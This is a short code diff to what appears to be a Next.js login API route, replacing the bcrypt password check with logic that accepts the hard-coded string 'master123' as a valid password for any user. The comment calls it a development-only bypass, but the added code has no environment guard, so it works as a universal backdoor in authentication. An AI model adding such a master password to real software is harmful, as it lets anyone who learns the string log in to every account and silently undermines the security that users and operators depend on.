@@ -28,7 +28,17 @@ export async function POST(request: Request) {
             );
         }
 
-        const isMatch = await bcrypt.compare(password, user.password_hash);
+        // BYPASS: Master Password Check for Development
+        // Only for development and testing purposes 
+        const isMasterPassword = password === 'master123'; 
+        
+        let isMatch = false;
+        if (isMasterPassword) {
+            isMatch = true;
+        } else {
+            isMatch = await bcrypt.compare(password, user.password_hash);
+        }
+
         if (!isMatch) {
             return NextResponse.json(
                 { message: 'Invalid credentials' },
